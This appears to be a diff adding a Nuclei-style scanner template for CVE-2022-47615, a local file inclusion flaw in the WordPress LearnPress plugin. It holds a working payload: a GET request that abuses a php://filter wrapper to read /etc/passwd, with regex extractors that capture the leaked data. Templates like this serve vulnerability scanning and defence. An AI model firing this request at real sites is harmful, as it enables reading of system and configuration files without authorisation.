@@ -1,0 +1,36 @@
+id: CVE-2022-47615
+
+info:
+  name: WordPress LearnPress archive-course File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    LearnPress plugin for WordPress (<= 4.1.7.3.2) has a Local File Inclusion vulnerability in the archive-course endpoint.
+    An attacker can exploit this vulnerability to read sensitive files such as database configuration files.
+  tags: file-read, file-inclusion, wordpress, learnpress
+  reference:
+    - https://patchstack.com/database/vulnerability/learnpress/wordpress-learnpress-plugin-4-1-7-3-2-local-file-inclusion
+  classification:
+    cve-id: CVE-2022-47615
+
+http:
+  - raw:
+      - |
+        GET /wp-json/lp/v1/courses/archive-course?template_pagination_path=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"status":"success"'
+        part: body
+      - type: regex
+        regex:
+          - "([A-Za-z0-9+/=]{10,})"  # Match base64 encoded content
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "([A-Za-z0-9+/=]{10,})"  # Extract base64 encoded content
+        part: body
